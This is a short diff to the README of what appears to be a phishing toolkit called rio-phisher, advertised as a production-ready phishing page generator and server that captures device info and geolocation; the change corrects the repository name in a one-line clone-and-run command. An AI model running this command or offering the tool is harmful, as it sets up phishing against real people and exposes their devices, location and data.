@@ -7,7 +7,7 @@ Production-ready phishing page generator & server. Captures **device info, geolo
 
 ```bash
 # Clone & Run (1 command)
-git clone https://github.com/riology/rio-phishing.git && cd rio-phisher && python3 phishing.py
+git clone https://github.com/riology/rio-phisher.git && cd rio-phisher && python3 phishing.py
 
 Works on: Termux/Android • Windows • Linux • macOS
 
